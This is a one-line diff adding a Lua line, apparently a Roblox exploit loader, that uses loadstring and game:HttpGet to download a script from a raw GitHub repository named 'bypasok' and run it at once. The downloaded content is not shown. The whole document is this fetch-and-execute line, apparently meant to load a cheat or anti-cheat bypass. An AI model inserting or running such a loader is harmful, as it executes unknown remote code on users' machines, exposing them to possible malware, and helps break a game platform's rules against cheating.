@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eikikrkr-ux/bypasok/refs/heads/main/ok"))()
